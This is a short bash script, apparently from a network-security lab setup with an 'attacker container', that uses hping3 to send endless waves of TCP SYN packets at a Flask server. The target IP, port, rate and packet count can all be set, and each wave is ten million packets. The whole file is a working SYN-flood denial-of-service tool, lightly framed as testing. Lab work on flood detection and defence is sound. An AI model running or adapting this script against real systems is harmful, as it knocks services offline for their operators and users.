#!/bin/bash

# Lightweight hping3 sender script
# Sends packets to the Flask server for network security testing

TARGET_IP="${TARGET_IP:-192.168.6.131}"
TARGET_PORT="${TARGET_PORT:-5000}"
PACKET_COUNT="${PACKET_COUNT:-10000000}"
PACKET_RATE="${PACKET_RATE:-1000}"

print_attacker_ip() {
    # Try to find the first non-loopback IPv4 address
    if command -v ip >/dev/null 2>&1; then
        ATTACKER_IP=$(ip -4 addr show scope global | awk '/inet/ {print $2}' | cut -d/ -f1 | head -n1)
    else
        if command -v hostname >/dev/null 2>&1; then
            ATTACKER_IP=$(hostname -I 2>/dev/null | awk '{print $1}')
        else
            ATTACKER_IP="unknown"
        fi
    fi
    ATTACKER_IP=${ATTACKER_IP:-unknown}
    echo "Attacker container IP: $ATTACKER_IP"
}

echo "Starting hping3 packet sender..."
echo "Target: $TARGET_IP:$TARGET_PORT"
echo "Packet Count: $PACKET_COUNT"
echo "Packet Rate: $PACKET_RATE packets/sec"
print_attacker_ip
echo ""

# Validate numeric inputs (positive integers)
re='^[0-9]+$'
if ! [[ $PACKET_COUNT =~ $re ]] || [ "$PACKET_COUNT" -le 0 ]; then
    echo "PACKET_COUNT must be a positive integer" >&2
    exit 2
fi
if ! [[ $PACKET_RATE =~ $re ]] || [ "$PACKET_RATE" -le 0 ]; then
    echo "PACKET_RATE must be a positive integer" >&2
    exit 2
fi

# Compute microsecond interval for hping3 (-i u<interval>):
# interval_us = 1000000 / PACKET_RATE
interval_us=$((1000000 / PACKET_RATE))
if [ "$interval_us" -lt 1 ]; then
    # minimum 1 microsecond
    interval_us=1
fi

echo "Using interval (microseconds): $interval_us"

# Run attack in loop - keep attacking continuously
while true; do
    echo "==================================="
    echo "Starting attack wave at $(date)"
    echo "==================================="
    
    # Send TCP SYN packets to the Flask server
    hping3 --syn -p "$TARGET_PORT" -c "$PACKET_COUNT" -i u"$interval_us" "$TARGET_IP"
    
    echo ""
    echo "Attack wave completed. Waiting 10 seconds before next wave..."
    sleep 10
done

